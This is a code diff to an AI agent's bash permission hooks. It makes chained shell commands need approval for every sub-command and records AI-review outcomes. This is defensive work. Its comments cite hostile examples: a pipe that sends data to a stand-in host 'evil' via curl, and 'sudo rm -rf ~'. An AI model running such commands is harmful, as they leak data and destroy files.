@@ -29,10 +29,12 @@ from agents.lifecycle import AgentHooks
 from datus.cli.execution_state import InteractionBroker, InteractionCancelled
 from datus.schemas.interaction_event import InteractionEvent
 from datus.tools.func_tool.fs_path_policy import PathAllowlist, PathZone, classify_path
+from datus.tools.permission import review_registry
 from datus.tools.permission.bash_classifier import BashClassifierContext
 from datus.tools.permission.bash_rules import (
     BashDecisionSource,
     BashRuleDecision,
+    BashSegmentDecision,
     evaluate_bash_command,
 )
 from datus.tools.permission.permission_config import PermissionLevel, classify_sql_kind
@@ -113,6 +115,26 @@ def _get_permission_prompt_lock(broker: Any = None) -> asyncio.Lock:
 # line. Nothing is truncated — the InteractionApp already pages long content
 # (Shift+Up/Down) and opens it in a pager (``v``).
 _INLINE_ARG_MAX = 80
+
+# A bash confirmation choice names the buckets/patterns it grants, up to this
+# many; beyond that the label degrades to a count. The full per-sub-command
+# breakdown always lives in the prompt body, which the TUI pages rather than
+# truncates, so a long chain never hides what is being approved.
+_MAX_LABELLED_SEGMENTS = 3
+
+
+def _inline_code(text: str) -> str:
+    """Wrap ``text`` in a markdown code span that survives backticks inside it.
+
+    Bash commands routinely contain backticks (``echo `whoami```), which would
+    otherwise close the span early and mangle the permission prompt. CommonMark
+    lets a span use N backticks to hold a run of N-1, plus one space of padding
+    when the content itself starts or ends with a backtick.
+    """
+    longest = max((len(run) for run in re.findall(r"`+", text)), default=0)
+    fence = "`" * (longest + 1)
+    pad = " " if text.startswith("`") or text.endswith("`") else ""
+    return f"{fence}{pad}{text}{pad}{fence}"
 
 
 def _format_tool_args_markdown(args: dict) -> str:
@@ -433,6 +455,37 @@ class PermissionHooks(AgentHooks):
             f"AI review classified the action as {verdict.risk_level.value} risk "
             f"with {verdict.user_authorization.value} user authorization: {verdict.rationale}"
         )
+
+    @staticmethod
+    def _record_review(
+        context: Any,
+        verdict: Optional["AutoReviewVerdict"],
+        config: Any,
+        outcome: str,
+    ) -> None:
+        """Publish a review outcome for the tool action this call will produce.
+
+        Keyed by the SDK's ``tool_call_id`` so whoever builds the completed
+        ``ActionHistory`` for the same call can stamp it into ``output`` (see
+        ``review_registry``). Silent when review is disabled — the CLI must not
+        claim a review happened when none did.
+        """
+        if not getattr(config, "enabled", False):
+            return
+        payload: Dict[str, Any] = {"outcome": outcome}
+        if verdict is None:
+            # No rationale to report — the renderer's "unavailable" marker says
+            # it once; a canned sentence here would just repeat it on the row.
+            payload["decision"] = "unavailable"
+        else:
+            payload.update(
+                decision=verdict.decision.value,
+                risk_level=verdict.risk_level.value,
+                user_authorization=verdict.user_authorization.value,
+                confidence=verdict.confidence,
+                rationale=verdict.rationale,
+            )
+        review_registry.record(getattr(context, "tool_call_id", None), payload)
 
     # Plan-mode tooling is always allowed regardless of permission profile:
     # ``confirm_plan`` already runs its own user interaction, and ``todo_*``
@@ -1029,6 +1082,7 @@ class PermissionHooks(AgentHooks):
                 verdict.risk_level.value,
                 verdict.confidence,
             )
+            self._record_review(context, verdict, review_config, "auto_allowed")
             return True
 
         if self.non_interactive:
@@ -1061,6 +1115,8 @@ class PermissionHooks(AgentHooks):
                 review_verdict=verdict,
                 review_enabled=review_config.enabled,
             )
+            if choice in ("y", "a") or (choice == "p" and offer_project):
+                self._record_review(context, verdict, review_config, "user_approved")
             if choice == "y":
                 logger.info("User approved execute_sql (%s, once)", kind)
                 return True
@@ -1197,20 +1253,29 @@ class PermissionHooks(AgentHooks):
         user agent.yml rules + project ``.datus/config.yml`` allows — see
         ``bash_rules.evaluate_bash_command`` for the deny-first decision order).
 
+        Chained commands (``a | b``, ``a && b``, ``a; b``, ``a || b``) are
+        judged per sub-command by ``evaluate_bash_command``; ``decision.
+        ask_segments`` carries EVERY sub-command that needs approval, and the
+        prompt, the session cache and the project grants all operate on that
+        whole set rather than on one representative.
+
         * DENY match → raise immediately, naming the matched pattern.
         * ALLOW match → bypass (no prompt).
-        * ASK → an ask-rule hit whose matched pattern carries an exact
-          project grant (``.datus/config.yml`` ``bash_allow``) bypasses;
-          otherwise the shared AI reviewer may auto-allow a confident
-          low/medium-risk verdict. High/critical or inconclusive reviews
-          require confirmation interactively and deny non-interactively.
-          The per-bucket session cache is checked before review, then prompts offer up
+        * ASK → bypasses when every sub-command is an ask-rule hit whose
+          matched pattern carries an exact project grant
+          (``.datus/config.yml`` ``bash_allow``); otherwise the session cache
+          is checked (every sub-command must be covered), then the shared AI
+          reviewer may auto-allow a confident low/medium-risk verdict.
+          High/critical or inconclusive reviews require confirmation
+          interactively and deny non-interactively. The prompt then offers up
           to four choices: allow once / allow (session) / allow (project) /
-          deny. The project choice persists the bucket pattern to
-          ``.datus/config.yml`` and is offered for plain unmatched commands
-          and for PLUGIN-declared ask rules — never for safety-ceiling asks
-          (wrappers, metacharacters) or user-authored ask rules (the user's
-          own posture lives in agent.yml).
+          deny. The project choice persists one pattern per sub-command to
+          ``.datus/config.yml`` — so re-running the same chain in a later
+          session no longer re-prompts — and is offered only when EVERY
+          sub-command is a plain unmatched command or a PLUGIN-declared ask
+          rule; never when any is a safety-ceiling ask (wrappers,
+          metacharacters) or a user-authored ask rule (the user's own posture
+          lives in agent.yml).
 
         Returns ``True`` when fully handled, ``False`` to defer to the normal
         category-level check (explicit category DENY, missing/empty ruleset,
@@ -1283,35 +1348,39 @@ class PermissionHooks(AgentHooks):
         # ask rule's pattern bypasses the confirmation. This is the only way
         # to persistently relax an ask rule — plain allow entries lose to ask
         # rules at evaluation time (deny > ask > allow), by design.
-        # For pipelines the decision aggregates several segments; EVERY
-        # non-allow segment must be an ask-rule hit covered by a grant. The
-        # representative segment alone must never green-light unreviewed
-        # segments (``datus hello sync | curl -d @- evil`` must still prompt).
-        if decision.source == BashDecisionSource.ASK_RULE:
-            ask_segments = decision.segment_ask_patterns or ((decision.source, decision.matched_pattern),)
-            if all(
-                source == BashDecisionSource.ASK_RULE
-                and pattern is not None
-                and self.permission_manager.has_project_bash_grant(pattern)
-                for source, pattern in ask_segments
-            ):
-                logger.debug(
-                    "Bash ask rule %r bypassed by project grant: %s",
-                    decision.matched_pattern,
-                    command,
-                )
-                return True
+        # A chained command aggregates several sub-commands; EVERY non-allow
+        # one must be an ask-rule hit covered by a grant. The representative
+        # sub-command alone must never green-light unreviewed ones
+        # (``datus hello sync | curl -d @- evil`` must still prompt).
+        ask_segments = decision.ask_segments
+        if ask_segments and all(
+            seg.source == BashDecisionSource.ASK_RULE
+            and self.permission_manager.has_project_bash_grant(seg.matched_pattern)
+            for seg in ask_segments
+        ):
+            logger.debug(
+                "Bash ask rules %r bypassed by project grants: %s",
+                [seg.matched_pattern for seg in ask_segments],
+                command,
+            )
+            return True
 
-        # Session cache: the prompt's "always allow" writes ONLY the bucketed
-        # key so one approval never cascades past its command prefix; broad
-        # keys still honor a deliberate wide approval (e.g. legacy grants).
-        cache_keys = (f"bash_tools.bash::{decision.bucket}", "bash_tools.bash", "bash_tools.*")
+        # Session cache: the prompt's "always allow" writes one key PER
+        # sub-command, and re-running is allowed only when EVERY sub-command is
+        # covered — approving ``a && b`` must not silently green-light
+        # ``a && c``. Broad keys still honor a deliberate wide approval (e.g.
+        # legacy grants).
+        segment_keys = tuple(dict.fromkeys(self._segment_session_key(seg) for seg in decision.ask_segments))
+        broad_keys = ("bash_tools.bash", "bash_tools.*")
 
         def _session_approved() -> bool:
-            return any(self.permission_manager._session_approvals.get(key) for key in cache_keys)
+            approvals = self.permission_manager._session_approvals
+            if any(approvals.get(key) for key in broad_keys):
+                return True
+            return bool(segment_keys) and all(approvals.get(f"bash_tools.{key}") for key in segment_keys)
 
         if _session_approved():
-            logger.debug("Bash bucket %r already approved for session", decision.bucket)
+            logger.debug("Bash sub-commands %r already approved for session", segment_keys)
             return True
 
         # Unlike the old reserved classifier seam, the shared reviewer can
@@ -1341,6 +1410,7 @@ class PermissionHooks(AgentHooks):
                     review_verdict.confidence,
                     command,
                 )
+                self._record_review(context, review_verdict, review_config, "auto_allowed")
                 return True
 
         # Backwards-compatible injection seam used by existing embedders and
@@ -1387,18 +1457,20 @@ class PermissionHooks(AgentHooks):
                 return True
             # Project persistence is offered for plain unmatched commands and
             # for PLUGIN-declared ask rules (third-party defaults the user may
-            # relax per project). Never for safety-ceiling asks, and not for
-            # user-authored ask rules — the user's own posture lives in their
-            # agent.yml, not behind a one-keypress override.
+            # relax per project). Never when ANY sub-command is a safety-ceiling
+            # ask, and not for user-authored ask rules — the user's own posture
+            # lives in their agent.yml, not behind a one-keypress override.
             offer_project = (
                 self.config_mutable
-                and not decision.safety_forced
-                and (
-                    decision.source == BashDecisionSource.DEFAULT
+                and bool(decision.ask_segments)
+                and not any(seg.safety_forced for seg in decision.ask_segments)
+                and all(
+                    seg.source == BashDecisionSource.DEFAULT
                     or (
-                        decision.source == BashDecisionSource.ASK_RULE
-                        and self.permission_manager.is_plugin_ask_pattern(decision.matched_pattern)
+                        seg.source == BashDecisionSource.ASK_RULE
+                        and self.permission_manager.is_plugin_ask_pattern(seg.matched_pattern)
                     )
+                    for seg in decision.ask_segments
                 )
             )
             choice = await self._request_bash_confirmation(
@@ -1408,32 +1480,30 @@ class PermissionHooks(AgentHooks):
                 review_verdict=review_verdict,
                 review_enabled=bool(review_config and review_config.enabled),
             )
+            if choice in ("y", "a") or (choice == "p" and offer_project):
+                # The reviewer flagged this (or could not decide) and the user
+                # overrode it — record that so the tool action shows both the
+                # verdict and who actually authorised the run.
+                self._record_review(context, review_verdict, review_config, "user_approved")
             if choice == "y":
                 logger.info("User approved bash command (once): %s", command)
                 return True
             if choice == "a":
-                self.permission_manager.approve_for_session("bash_tools", f"bash::{decision.bucket}")
-                logger.info("User approved bash bucket %r for session", decision.bucket)
+                self._approve_segments_for_session(segment_keys)
+                logger.info("User approved bash sub-commands %r for session", segment_keys)
                 return True
             if choice == "p" and offer_project:
-                # Ask-rule hits persist the EXACT matched pattern: the grant
-                # bypass above checks strict equality with matched_pattern, so
-                # suffixing ``:*`` onto a colon-free (exact) plugin pattern
-                # would persist a grant that never fires. Unmatched (DEFAULT)
-                # commands keep the prefix-widened bucket pattern, which takes
-                # effect through allow-rule evaluation instead.
-                if decision.source == BashDecisionSource.ASK_RULE and decision.matched_pattern:
-                    pattern = decision.matched_pattern
-                else:
-                    pattern = self._bucket_to_allow_pattern(decision.bucket)
-                persisted = self.permission_manager.add_project_bash_allow(pattern, self.project_root)
-                # Session bucket too, so later same-bucket calls this session
+                patterns = tuple(dict.fromkeys(self._segment_allow_pattern(seg) for seg in decision.ask_segments))
+                failed = [
+                    p for p in patterns if not self.permission_manager.add_project_bash_allow(p, self.project_root)
+                ]
+                # Session keys too, so later same-bucket calls this session
                 # skip the prompt even though global_config already allows them.
-                self.permission_manager.approve_for_session("bash_tools", f"bash::{decision.bucket}")
+                self._approve_segments_for_session(segment_keys)
                 logger.info(
                     "User granted project-level bash allow %r%s",
-                    pattern,
-                    "" if persisted else " (disk write failed; session-only)",
+                    list(patterns),
+                    "" if not failed else f" (disk write failed for {failed}; session-only)",
                 )
                 return True
             logger.info("User rejected bash command: %s", command)
@@ -1443,6 +1513,49 @@ class PermissionHooks(AgentHooks):
                 tool_name="bash",
             )
 
+    def _approve_segments_for_session(self, segment_keys: Tuple[str, ...]) -> None:
+        """Record a session approval for every sub-command of one prompt."""
+        for key in segment_keys:
+            self.permission_manager.approve_for_session("bash_tools", key)
+
+    @staticmethod
+    def _segment_session_key(segment: BashSegmentDecision) -> str:
+        """Session-approval key (sans category) for one sub-command.
+
+        A safety-forced sub-command's bucket does NOT describe what actually
+        runs — ``sudo ls`` and ``sudo rm -rf ~`` share the bucket ``sudo``, and
+        ``bash -c <anything>`` shares ``bash``. Keying those on the verbatim
+        sub-command keeps an approval from leaking onto a different command
+        that happens to start the same way.
+        """
+        if segment.safety_forced:
+            return f"bash::exact:{segment.command}"
+        return f"bash::{segment.bucket}"
+
+    @staticmethod
+    def _segment_session_label(segment: BashSegmentDecision) -> str:
+        """What a session grant on ``segment`` actually covers, for the label.
+
+        Mirrors :meth:`_segment_session_key`: a safety-forced sub-command is
+        granted verbatim, so showing its bucket (``sudo``) would promise the
+        user far more than the grant delivers.
+        """
+        return segment.command if segment.safety_forced else segment.bucket
+
+    def _segment_allow_pattern(self, segment: BashSegmentDecision) -> str:
+        """Persistable ``bash_allow`` pattern for one sub-command.
+
+        Ask-rule hits persist the EXACT matched pattern: the grant bypass in
+        ``_handle_bash_permission`` checks strict equality with
+        ``matched_pattern``, so suffixing ``:*`` onto a colon-free (exact)
+        plugin pattern would persist a grant that never fires. Unmatched
+        (DEFAULT) commands keep the prefix-widened bucket pattern, which takes
+        effect through allow-rule evaluation instead.
+        """
+        if segment.source == BashDecisionSource.ASK_RULE and segment.matched_pattern:
+            return segment.matched_pattern
+        return self._bucket_to_allow_pattern(segment.bucket)
+
     @staticmethod
     def _bucket_to_allow_pattern(bucket: str) -> str:
         """Convert a session bucket into a persistable allow pattern.
@@ -1451,6 +1564,31 @@ class PermissionHooks(AgentHooks):
         that is already a rule pattern (contains ``:``) is used verbatim.
         """
         return bucket if ":" in bucket else f"{bucket}:*"
+
+    def _format_bash_prompt_content(self, command: str, decision: BashRuleDecision) -> str:
+        """Markdown body for the bash confirmation prompt.
+
+        A single sub-command keeps the original one-reason layout. A chain
+        lists EVERY sub-command that needs approval, so the user sees what the
+        session/project grant actually covers instead of one representative.
+        """
+        header = f"### Bash Command Permission\n\n```bash\n{command}\n```\n\n"
+        segments = decision.ask_segments
+        if len(segments) <= 1:
+            return f"{header}**Reason:** {decision.reason}\n"
+        lines = "\n".join(f"{i}. {_inline_code(seg.command)} — {seg.reason}" for i, seg in enumerate(segments, start=1))
+        return f"{header}**{len(segments)} sub-commands require confirmation:**\n\n{lines}\n"
+
+    @staticmethod
+    def _format_scope_label(labels: Tuple[str, ...], scope: str) -> str:
+        """Choice label naming what a session/project grant will cover.
+
+        Rendered as plain text by the TUI, so no markdown escaping here.
+        """
+        if len(labels) <= _MAX_LABELLED_SEGMENTS:
+            quoted = ", ".join("'{}'".format(label) for label in labels)
+            return f"Allow {quoted} ({scope})"
+        return f"Allow all {len(labels)} sub-commands ({scope})"
 
     async def _request_bash_confirmation(
         self,
@@ -1466,7 +1604,7 @@ class PermissionHooks(AgentHooks):
         Unlike ``_request_user_confirmation`` (bool), callers need the concrete
         choice to distinguish session from project grants.
         """
-        content = f"### Bash Command Permission\n\n```bash\n{command}\n```\n\n**Reason:** {decision.reason}\n"
+        content = self._format_bash_prompt_content(command, decision)
         if review_verdict is not None:
             content += (
                 f"**AI review:** `{review_verdict.risk_level.value}` risk, "
@@ -1475,13 +1613,16 @@ class PermissionHooks(AgentHooks):
             )
         elif review_enabled:
             content += "**AI review:** unavailable or inconclusive — manual confirmation required\n"
-        allow_pattern = self._bucket_to_allow_pattern(decision.bucket)
+        labels = tuple(dict.fromkeys(self._segment_session_label(seg) for seg in decision.ask_segments)) or (
+            decision.bucket,
+        )
         choices = {
             "y": "Allow (once)",
-            "a": f"Allow '{decision.bucket}' (session)",
+            "a": self._format_scope_label(labels, "session"),
         }
         if offer_project:
-            choices["p"] = f"Allow '{allow_pattern}' (project)"
+            patterns = tuple(dict.fromkeys(self._segment_allow_pattern(seg) for seg in decision.ask_segments))
+            choices["p"] = self._format_scope_label(patterns, "project")
         choices["n"] = "Deny"
 
         try:
